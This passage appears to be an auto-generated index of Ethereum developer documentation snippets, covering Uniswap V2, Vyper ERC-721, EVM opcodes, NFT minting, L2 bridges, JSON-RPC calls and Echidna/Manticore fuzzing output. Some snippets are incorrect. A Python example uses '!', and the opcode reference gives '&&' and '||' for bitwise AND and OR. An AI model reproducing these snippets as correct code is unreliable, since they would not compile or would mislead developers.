adding new name-value pairs but doesn't allow modification or removal.\n\nLANGUAGE: py\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWalletPressed Handler in React\nDESCRIPTION: This function handles the wallet connection button press. It calls the connectWallet function and updates the component state with the response, setting both the status message and wallet address.\n\nLANGUAGE: javascript\nCODE:\n```\nconst connectWalletPressed = async () => {\n  const walletResponse = await connectWallet()\n  setStatus(walletResponse.status)\n  setWallet(walletResponse.address)\n}\n```\n\n----------------------------------------\n\nTITLE: Depositing Assets in ERC-4626 Vault\nDESCRIPTION: The deposit function allows users to deposit underlying assets into the vault in exchange for vault shares, which are assigned to the specified receiver address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction deposit(uint256 assets, address receiver) public returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Installing dotenv for Environment Variables Management\nDESCRIPTION: Command to install the dotenv package which allows safe storage of API keys and private keys as environment variables.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Declaring Minter Address in Vyper NFT Contract\nDESCRIPTION: Declaration of the minter address variable, which represents the entity that can mint new tokens in the contract. This is a simple approach suitable for games or similar applications.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Address of minter, who can mint a token\nminter: address\n```\n\n----------------------------------------\n\nTITLE: CALLER Opcode in EVM\nDESCRIPTION: The CALLER opcode returns the address of the message sender. It takes no inputs from the stack and pushes the address of the account that called the current execution context onto the stack.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nmsg.sender\n```\n\n----------------------------------------\n\nTITLE: Using Low-Level Call and Ignoring Second Return Value\nDESCRIPTION: Example of using the low-level call method on a contract address while only caring about the success boolean return value and ignoring the returned data.\n\nLANGUAGE: solidity\nCODE:\n```\n        (_success,) = address(worm).call(_callInput);\n```\n\n----------------------------------------\n\nTITLE: EVM Bitwise and Comparison Operations in Solidity\nDESCRIPTION: Reference for EVM bitwise and comparison operations including EQ, ISZERO, AND, OR, XOR, NOT, BYTE, SHL, SHR, and SAR opcodes with their gas costs and equivalent Solidity expressions.\n\nLANGUAGE: solidity\nCODE:\n```\na == b     // EQ opcode - (u)int256 equality\na == 0     // ISZERO opcode - (u)int256 iszero\na && b     // AND opcode - bitwise AND\na || b     // OR opcode - bitwise OR\na ^ b      // XOR opcode - bitwise XOR\n~a         // NOT opcode - bitwise NOT\n(x >> (248 - i * 8)) && 0xFF  // BYTE opcode - ith byte of (u)int256 x from the left\nval << shift  // SHL opcode - shift left\nval >> shift  // SHR opcode - logical shift right\nval >> shift  // SAR opcode - arithmetic shift right\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Read Function in Solidity\nDESCRIPTION: A function to retrieve values from the cache using their keys, with validation to prevent reading uninitialized entries.\n\nLANGUAGE: solidity\nCODE:\n```\n    function cacheRead(uint _key) public view returns (uint) {\n        require(_key <= key2val.length, \"Reading uninitialize cache entry\");\n        return key2val[_key-1];\n    }  // cacheRead\n```\n\n----------------------------------------\n\nTITLE: Running Echidna to Find Assertion Failures\nDESCRIPTION: Command-line output showing Echidna finding an assertion violation in the Incrementor contract. The tool identifies specific call sequences that trigger the overflow issue.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test assert.sol --config config.yaml\nAnalyzing contract: assert.sol:Incrementor\nassertion in inc: failed!💥\n  Call sequence, shrinking (2596/5000):\n    inc(21711016731996786641919559689128982722488122124807605757398297001483711807488)\n    inc(7237005577332262213973186563042994240829374041602535252466099000494570602496)\n    inc(86844066927987146567678238756515930889952488499230423029593188005934847229952)\n\nSeed: 1806480648350826486\n```\n\n----------------------------------------\n\nTITLE: Constant Product Value Storage in Uniswap V2\nDESCRIPTION: Stores the product of reserves (reserve0 * reserve1) after the most recent liquidity event, used to maintain the constant product formula.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n```\n\n----------------------------------------\n\nTITLE: Safe Token Transfer in Uniswap V2 Pair\nDESCRIPTION: Handles ERC-20 token transfers safely by checking both possible failure modes: reversion and boolean return value.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _safeTransfer(address token, address to, uint value) private {\n    (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n    require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n}\n```\n\n----------------------------------------\n\nTITLE: EVM SWAP Operations Reference\nDESCRIPTION: Reference table for EVM SWAP operations (SWAP1 through SWAP16) which exchange stack items at specific positions. These operations require 3 gas units each and manipulate the stack by swapping item positions.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n90   | SWAP1          | 3 | `a, b`           | `b, a`\n91   | SWAP2          | 3 | `a, _, b`        | `b, _, a`\n92   | SWAP3          | 3 | `a, _, _, b`     | `b, _, _, a`\n93   | SWAP4          | 3 | `a, _, _, _, b`  | `b, _, _, _, a`\n94-9F | SWAP5-SWAP16   | 3 | `a, ..., b`      | `b, ..., a`\n```\n\n----------------------------------------\n\nTITLE: Testing Write and Revert in WORM Contract\nDESCRIPTION: Test function that verifies the WORM contract correctly prevents overwriting entries. It uses vm.expectRevert to check that the contract reverts with the correct error message.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testWReadWrite() public {\n        worm.writeEntry(0xDEAD, 0x60A7);\n\n        vm.expectRevert(bytes(\"entry already written\"));\n        worm.writeEntry(0xDEAD, 0xBEEF);\n```\n\n----------------------------------------\n\nTITLE: Setting Up and Executing Ethereum Transaction for NFT Minting\nDESCRIPTION: Code that configures transaction parameters and sends an Ethereum transaction through MetaMask to mint an NFT, handling both success and error cases.\n\nLANGUAGE: javascript\nCODE:\n```\n//set up your Ethereum transaction\nconst transactionParameters = {\n  to: contractAddress, // Required except during contract publications.\n  from: window.ethereum.selectedAddress, // must match user's active address.\n  data: window.contract.methods\n    .mintNFT(window.ethereum.selectedAddress, tokenURI)\n    .encodeABI(), //make call to NFT smart contract\n}\n\n//sign the transaction via MetaMask\ntry {\n  const txHash = await window.ethereum.request({\n    method: \"eth_sendTransaction\",\n    params: [transactionParameters],\n  })\n  return {\n    success: true,\n    status:\n      \"✅ Check out your transaction on Etherscan: https://ropsten.etherscan.io/tx/\" +\n      txHash,\n  }\n} catch (error) {\n  return {\n    success: false,\n    status: \"😥 Something went wrong: \" + error.message,\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: CREATE Operation in EVM\nDESCRIPTION: Creates a new contract with code from memory. Returns the address of the newly created contract calculated from the sender address and nonce.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: Starting the React NFT Minter Development Server\nDESCRIPTION: Command to start the local development server for the React NFT minter application. This launches the application in the browser at http://localhost:3000/ where you can see the frontend interface.\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Using Custom Image Component with Chakra UI and Next.js\nDESCRIPTION: Shows how to import and use the custom Image component that combines Next.js Image optimization with Chakra UI styling capabilities.\n\nLANGUAGE: tsx\nCODE:\n```\nimport { Image } from \"@/components/Image\"\n```\n\n----------------------------------------\n\nTITLE: Starting the React NFT Minter Development Server\nDESCRIPTION: Command to start the local development server for the React NFT minter application. This launches the application in the browser at http://localhost:3000/ where you can see the frontend interface.\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Smart Contract Deployment Script with Ethers.js\nDESCRIPTION: JavaScript deployment script that uses ethers.js through Hardhat to deploy the HelloWorld smart contract to the Ethereum network with an initial message.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const HelloWorld = await ethers.getContractFactory(\"HelloWorld\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const hello_world = await HelloWorld.deploy(\"Hello World!\")\n  console.log(\"Contract deployed to address:\", hello_world.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: CrossDomainEnabled Contract Structure and Constructor\nDESCRIPTION: Defines the CrossDomainEnabled contract with its constructor that initializes the messenger address. This messenger contract is used to communicate between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title CrossDomainEnabled\n * @dev Helper contract for contracts performing cross-domain communications\n *\n * Compiler used: defined by inheriting contract\n */\ncontract CrossDomainEnabled {\n    /*************\n     * Variables *\n     *************/\n\n    // Messenger contract used to send and receive messages from the other domain.\n    address public messenger;\n\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _messenger Address of the CrossDomainMessenger on the current layer.\n     */\n    constructor(address _messenger) {\n        messenger = _messenger;\n    }\n```\n\n----------------------------------------\n\nTITLE: Checking Constraint Viability in Manticore\nDESCRIPTION: Demonstrates how to verify if a state with added constraints is still viable using the solver.check method.\n\nLANGUAGE: python\nCODE:\n```\nstate.constrain(symbolic_var != 65)\nif solver.check(state.constraints):\n    # state is feasible\n```\n\n----------------------------------------\n\nTITLE: Importing L2 Bridge Dependencies in Solidity\nDESCRIPTION: Imports necessary interfaces including IL1StandardBridge, IL1ERC20Bridge, and IL2ERC20Bridge which define the contract interfaces for the bridging functionality between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\n/* Interface Imports */\nimport { IL1StandardBridge } from \"../../L1/messaging/IL1StandardBridge.sol\";\nimport { IL1ERC20Bridge } from \"../../L1/messaging/IL1ERC20Bridge.sol\";\nimport { IL2ERC20Bridge } from \"./IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Configurando o ambiente Web3 para interagir com a blockchain Ethereum\nDESCRIPTION: Inicializa o ambiente Web3 para permitir interações com a blockchain Ethereum, importando as variáveis de ambiente e criando uma instância do Alchemy Web3.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n```\n\n----------------------------------------\n\nTITLE: Basic Echidna Test Run on Gas Contract\nDESCRIPTION: Initial run of Echidna on the gas consumption contract without special configuration, showing the test property passes.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test gas.sol\n...\nechidna_test: passed! 🎉\n\nSeed: 2320549945714142710\n```\n\n----------------------------------------\n\nTITLE: Transferring Ether to an Account in VB.NET using Nethereum\nDESCRIPTION: Example code for transferring ether from one account to another using Nethereum in VB.NET. Demonstrates transaction creation and submission.\n\nLANGUAGE: VB.NET\nCODE:\n```\n// Playground link: http://playground.nethereum.com/vb/id/2003\n```\n\n----------------------------------------\n\nTITLE: Constructor in Uniswap V2 Pair\nDESCRIPTION: Sets the factory address during pair deployment to maintain a reference to the factory that created this pair.\n\nLANGUAGE: solidity\nCODE:\n```\nconstructor() public {\n    factory = msg.sender;\n}\n```\n\n----------------------------------------\n\nTITLE: Preventing Transfers to Invalid Addresses in ERC-20 Token\nDESCRIPTION: Extended implementation of _beforeTokenTransfer that prevents users from sending tokens to the contract itself or to empty addresses. It uses assembly to check if the destination is a contract.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(to != address(this), \"Can't send tokens to the contract address\");\n        bool isToContract;\n        assembly {\n           isToContract := gt(extcodesize(to), 0)\n        }\n        require(to.balance != 0 || isToContract, \"Can't send tokens to an empty address\");\n```\n\n----------------------------------------\n\nTITLE: Installing Manticore through pip\nDESCRIPTION: Command to install Manticore using pip package manager. This is an alternative to using the Docker installation method.\n\nLANGUAGE: bash\nCODE:\n```\npip3 install --user manticore\n```\n\n----------------------------------------\n\nTITLE: Implementing getApproved Function for ERC-721\nDESCRIPTION: A view function that returns the approved address for a specific NFT. It throws an error if the token ID is not valid. Returns zero address if no approval exists for the token.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef getApproved(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Get the approved address for a single NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId ID of the NFT to query the approval of.\n    \"\"\"\n    # Throws if `_tokenId` is not a valid NFT\n    assert self.idToOwner[_tokenId] != ZERO_ADDRESS\n    return self.idToApprovals[_tokenId]\n```\n\n----------------------------------------\n\nTITLE: Creating a Guest Book Contract in Fe\nDESCRIPTION: A simple contract implemented in Fe that creates a guest book where users can sign messages and retrieve messages by address. It demonstrates Fe's syntax for mapping types, events, and public functions.\n\nLANGUAGE: fe\nCODE:\n```\ntype BookMsg = bytes[100]\n\ncontract GuestBook:\n    pub guest_book: map<address, BookMsg>\n\n    event Signed:\n        book_msg: BookMsg\n\n    pub def sign(book_msg: BookMsg):\n        self.guest_book[msg.sender] = book_msg\n\n        emit Signed(book_msg=book_msg)\n\n    pub def get_msg(addr: address) -> BookMsg:\n        return self.guest_book[addr].to_mem()\n\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity with Permit for Token Pairs in Uniswap V2\nDESCRIPTION: Function to remove liquidity using the ERC20 permit functionality to approve the router with a signature. This enables gas-less transactions for liquidity providers as they don't need to submit a separate approve transaction.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountA, uint amountB) {\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n}\n```\n\n----------------------------------------\n\nTITLE: Stack Management for Function Call in 0x81e580d3\nDESCRIPTION: This section manages the stack by swapping values and jumping to the main function logic. It organizes the stack to prepare for the lookup operation.\n\nLANGUAGE: evm\nCODE:\n```\n1A3 | SWAP2               | 0x0153 CALLDATASIZE calldataload(4) 0xDA                                     |\n1A4 | SWAP1               | CALLDATASIZE 0x0153 calldataload(4) 0xDA                                     |\n1A5 | POP                 | 0x0153 calldataload(4) 0xDA                                                  |\n1A6 | JUMP                | calldataload(4) 0xDA                                                         |\n153 | JUMPDEST            | calldataload(4) 0xDA                                                         |\n154 | PUSH2 0x016e        | 0x016E calldataload(4) 0xDA                                                  |\n157 | JUMP                | calldataload(4) 0xDA                                                         |\n```\n\n----------------------------------------\n\nTITLE: Remaining ETH Bridge Functions for IL1StandardBridge\nDESCRIPTION: Defines the remaining events and functions for ETH bridging in IL1StandardBridge. These functions mirror the ERC-20 equivalents but are specialized for ETH transfers between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n    event ETHWithdrawalFinalized(\n        .\n        .\n        .\n    );\n\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev Deposit an amount of the ETH to the caller's balance on L2.\n            .\n            .\n            .\n     */\n    function depositETH(uint32 _l2Gas, bytes calldata _data) external payable;\n\n    /**\n     * @dev Deposit an amount of ETH to a recipient's balance on L2.\n            .\n            .\n            .\n     */\n    function depositETHTo(\n        address _to,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external payable;\n\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ETH token. Since only the xDomainMessenger can call this function, it will never be called\n     * before the withdrawal is finalized.\n                .\n                .\n                .\n     */\n    function finalizeETHWithdrawal(\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freeze Tracking in Solidity\nDESCRIPTION: A mapping that associates Ethereum addresses with boolean values to keep track of which accounts are frozen. By default, all accounts start as unfrozen (false).\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => bool) public frozenAccounts;\n```\n\n----------------------------------------\n\nTITLE: Installing web3.js with npm\nDESCRIPTION: Command to install web3.js package using npm for backend projects or frontend projects that use a build system.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install web3 --save\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed Point Mathematics in Uniswap V2\nDESCRIPTION: A library for handling binary fixed point numbers in Q112.112 format, where values are encoded as x * 2^112. It provides functions for encoding integers and dividing fixed point numbers.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\n// a library for handling binary fixed point numbers (https://wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 {\n    uint224 constant Q112 = 2**112;\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; // never overflows\n    }\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Daily Block Production on Ethereum\nDESCRIPTION: This SQL query calculates the average number of blocks produced per day on Ethereum. It uses a Common Table Expression (CTE) to first count blocks by day, then calculates the average of those daily counts.\n\nLANGUAGE: sql\nCODE:\n```\nWITH temp_table AS (\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n)\nSELECT\n    AVG(block_count) AS avg_block_count\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: Implementing CrossDomainEnabled Contract with Constructor\nDESCRIPTION: Definition of the CrossDomainEnabled contract including its state variable for storing the messenger address and the constructor that initializes it. This contract serves as a helper for cross-domain communications.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title CrossDomainEnabled\n * @dev Helper contract for contracts performing cross-domain communications\n *\n * Compiler used: defined by inheriting contract\n */\ncontract CrossDomainEnabled {\n    /*************\n     * Variables *\n     *************/\n\n    // Messenger contract used to send and receive messages from the other domain.\n    address public messenger;\n\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _messenger Address of the CrossDomainMessenger on the current layer.\n     */\n    constructor(address _messenger) {\n        messenger = _messenger;\n    }\n```\n\n----------------------------------------\n\nTITLE: Setting Contract Addresses for Test Networks\nDESCRIPTION: Defines the addresses where the Greeter contract is deployed on Holesky and Sepolia test networks, using the previously defined address mapping type.\n\nLANGUAGE: tsx\nCODE:\n```\nconst contractAddrs: AddressPerBlockchainType = {\n  // Holesky\n  17000: '0x432d810484AdD7454ddb3b5311f0Ac2E95CeceA8',\n\n  // Sepolia\n  11155111: '0x7143d5c190F048C8d19fe325b748b081903E3BF0'\n}\n```\n\n----------------------------------------\n\nTITLE: CREATE Opcode (F0) Usage and Behavior\nDESCRIPTION: The CREATE opcode (F0) creates a new contract and returns the new contract address. It uses the calling contract's address and nonce to generate a deterministic address via keccak256 hashing.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: ISZERO Opcode in EVM\nDESCRIPTION: The ISZERO opcode checks if a value is zero. It takes one int256 or uint256 value from the stack and returns 1 if the value is zero or 0 if it's not.\n\nLANGUAGE: evm-assembly\nCODE:\n```\na == 0\n```\n\n----------------------------------------\n\nTITLE: Running the Client Example\nDESCRIPTION: Command to execute the Node.js client example that demonstrates writing and reading from the WORM contract.\n\nLANGUAGE: sh\nCODE:\n```\nnode index.js\n```\n\n----------------------------------------\n\nTITLE: Executing Low-level Call to Test Cache\nDESCRIPTION: Performs a low-level call to the Cache contract and verifies the success of the operation.\n\nLANGUAGE: solidity\nCODE:\n```\n        );\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n```\n\n----------------------------------------\n\nTITLE: Ethereum Cryptographic and Context Access Operations\nDESCRIPTION: Reference for Ethereum cryptographic operations (KECCAK256) and context access opcodes (ADDRESS, BALANCE, ORIGIN, CALLER, CALLVALUE, CALLDATALOAD, CALLDATASIZE, CALLDATACOPY) with their gas costs and equivalent Solidity expressions.\n\nLANGUAGE: solidity\nCODE:\n```\nkeccak256(mem[ost:ost+len-1])  // KECCAK256 opcode\naddress(this)  // ADDRESS opcode - address of executing contract\naddr.balance   // BALANCE opcode - balance in wei\ntx.origin      // ORIGIN opcode - address that originated the tx\nmsg.sender     // CALLER opcode - address of msg sender\nmsg.value      // CALLVALUE opcode - msg value in wei\nmsg.data[idx:idx+32]  // CALLDATALOAD opcode - read word from msg data at index idx\nlen(msg.data)  // CALLDATASIZE opcode - length of msg data in bytes\n// CALLDATACOPY opcode - copy msg data\n// mem[dstOst:dstOst+len-1] := msg.data[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Starting the React NFT Minter Development Server\nDESCRIPTION: Command to start the local development server for the React NFT minter application. This launches the application in the browser at http://localhost:3000/ where you can see the frontend interface.\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Cumulative Price Tracking in Uniswap V2\nDESCRIPTION: Maintains cumulative price data for both tokens, which can be used to calculate average exchange rates over time periods.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public price0CumulativeLast;\nuint public price1CumulativeLast;\n```\n\n----------------------------------------\n\nTITLE: Setting Non-Cached Parameters in Function Call\nDESCRIPTION: Demonstrates how to include parameters that shouldn't be cached alongside cached parameters in a function call.\n\nLANGUAGE: solidity\nCODE:\n```\n            // Second value, don't add it to the cache\n            cache.DONT_CACHE(),\n            bytes32(VAL_B),\n\n            // Third and fourth values, same value\n            bytes1(0x02),\n            bytes1(0x02)\n        );\n        .\n        .\n        .\n    }   // testReadParam\n```\n\n----------------------------------------\n\nTITLE: Setting Non-Cached Parameters in Function Call\nDESCRIPTION: Demonstrates how to include parameters that shouldn't be cached alongside cached parameters in a function call.\n\nLANGUAGE: solidity\nCODE:\n```\n            // Second value, don't add it to the cache\n            cache.DONT_CACHE(),\n            bytes32(VAL_B),\n\n            // Third and fourth values, same value\n            bytes1(0x02),\n            bytes1(0x02)\n        );\n        .\n        .\n        .\n    }   // testReadParam\n```\n\n----------------------------------------\n\nTITLE: Checking Protocol Fee Recipient in Uniswap V2 (Solidity)\nDESCRIPTION: This code checks if protocol fees are enabled by retrieving the feeTo address from the factory. If feeTo is the zero address, protocol fees are disabled and no additional calculation is needed.\n\nLANGUAGE: solidity\nCODE:\n```\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n```\n\n----------------------------------------\n\nTITLE: Concatenating Transaction Return Data in Manticore\nDESCRIPTION: Demonstrates how to use the CONCAT operator to convert transaction return data into a value that can be checked against other values.\n\nLANGUAGE: python\nCODE:\n```\nlast_return = Operators.CONCAT(256, *last_return)\n```\n\n----------------------------------------\n\nTITLE: Resetting kLast for Gas Refunds in Uniswap V2 (Solidity)\nDESCRIPTION: This code resets kLast to zero when protocol fees are disabled but kLast has a non-zero value. This takes advantage of Ethereum's gas refund mechanism (which existed when the contract was written) that incentivizes reducing state size by clearing unused storage.\n\nLANGUAGE: solidity\nCODE:\n```\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Faucet Function in an ERC-20 Token Contract in Solidity\nDESCRIPTION: A standard ERC-20 contract with an additional faucet function that allows any user to mint 1000 tokens to themselves for testing purposes. This function would not be useful in a production environment but facilitates testing of the token contract.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Gives the caller 1000 tokens to play with\n     */\n    function faucet() external {\n        _mint(msg.sender, 1000);\n    }   // function faucet\n```\n\n----------------------------------------\n\nTITLE: Solidity Assert Statement Example\nDESCRIPTION: A code snippet from the glossary showing how assert() statements work in Solidity. The glossary explains that assert(false) compiles to invalid opcode 0xfe, uses all remaining gas, and reverts all changes. It's used to check conditions that should never occur.\n\nLANGUAGE: solidity\nCODE:\n```\nassert(false)\n```\n\n----------------------------------------\n\nTITLE: Referencing JavaScript Component for Staking Products Display Logic\nDESCRIPTION: The document references a JavaScript component that contains the logic and weighting system used to calculate scores for staking products based on their adherence to the inclusion criteria. This component handles the sorting and display of products on the ethereum.org website.\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Code referenced in document:\n// The code logic and weights for these criteria are currently contained in [this JavaScript component](https://github.com/ethereum/ethereum-org-website/blob/dev/src/components/Staking/StakingProductsCardGrid.js#L350) in our repo.\n```\n\n----------------------------------------\n\nTITLE: Fetching CryptoKitties Birth Events using Web3.py in Python\nDESCRIPTION: Code that retrieves recent birth logs from the CryptoKitties smart contract by querying the Ethereum blockchain for specific event topics within the last 120 blocks. The events are then parsed to extract the relevant birth data from each log.\n\nLANGUAGE: python\nCODE:\n```\nbirth_logs = w3.eth.getLogs({\n    \"fromBlock\": w3.eth.blockNumber - 120,\n    \"address\": w3.toChecksumAddress(ck_token_addr),\n    \"topics\": [ck_extra_events_abi[1]]\n})\n\nrecent_births = [get_event_data(ck_extra_events_abi[1], log)[\"args\"] for log in birth_logs]\n```\n\n----------------------------------------\n\nTITLE: Implementing sendCrossDomainMessage Function Body with Static Analysis Directives\nDESCRIPTION: Function body for sending cross-domain messages with Slither static analyzer directives to suppress false positive warnings about reentrancy vulnerabilities.\n\nLANGUAGE: solidity\nCODE:\n```\n    ) internal {\n        // slither-disable-next-line reentrancy-events, reentrancy-benign\n        getCrossDomainMessenger().sendMessage(_crossDomainTarget, _message, _gasLimit);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Seeded Corpus\nDESCRIPTION: Results from running Echidna after seeding the corpus with a file containing the correct magic values, showing how it now finds the property violation.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol --config config.yaml\n...\nechidna_magic_values: failed!💥\n  Call sequence:\n    magic(42,129,333,0)\n\n\nUnique instructions: 142\nUnique codehashes: 1\nSeed: -7293830866560616537\n\n```\n\n----------------------------------------\n\nTITLE: Transferring Tokens to Pair in Solidity\nDESCRIPTION: Code that safely transfers the calculated amounts of tokens from the user to the pair contract using the TransferHelper library.\n\nLANGUAGE: solidity\nCODE:\n```\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_coinbase en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir l'adresse coinbase du client en utilisant la méthode eth_coinbase. Cette méthode est obsolète depuis la version v1.14.0.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_coinbase\",\"params\":[],\"id\":64}'\n// Result\n{\n  \"id\":64,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x407d73d8a49eeb85d32cf465507dd71d507100c1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Swap Exact Tokens For Tokens in Solidity\nDESCRIPTION: This function allows users to swap a specific amount of input tokens for at least a minimum amount of output tokens. It calculates the expected output amounts, transfers the input tokens to the first pair, and initiates the swap.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: eth_getUncleCountByBlockHash Request and Response Example\nDESCRIPTION: A complete cURL request and response example for the eth_getUncleCountByBlockHash method. This demonstrates how to query the number of uncles in a block using the block hash and the expected JSON-RPC response format.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getUncleCountByBlockHash\",\"params\":[\"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\"],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x1\" // 1\n}\n```\n\n----------------------------------------\n\nTITLE: Defining State Variables for ERC-721 Token\nDESCRIPTION: This snippet defines the state variables needed to track token ownership and approvals. It includes mappings for token owners, approved addresses, token counts per owner, operator permissions, and minting authorization.\n\nLANGUAGE: python\nCODE:\n```\n# @dev Mapping from NFT ID to the address that owns it.\nidToOwner: HashMap[uint256, address]\n\n# @dev Mapping from NFT ID to approved address.\nidToApprovals: HashMap[uint256, address]\n\n# @dev Mapping from owner address to count of his tokens.\nownerToNFTokenCount: HashMap[address, uint256]\n\n# @dev Mapping from owner address to mapping of operator addresses.\nownerToOperators: HashMap[address, HashMap[address, bool]]\n\n# @dev Address of minter, who can mint a token\nminter: address\n\n# @dev Mapping of interface id to bool about whether or not it's supported\nsupportedInterfaces: HashMap[bytes32, bool]\n```\n\n----------------------------------------\n\nTITLE: Revert Logic in 0x81e580d3 Function\nDESCRIPTION: The execution path for handling insufficient call data, which results in a revert operation with no return data.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n19D | DUP1   | 0x00 0x00 0x04 CALLDATASIZE 0x0153 0xDA\n19E | DUP2   | 0x00 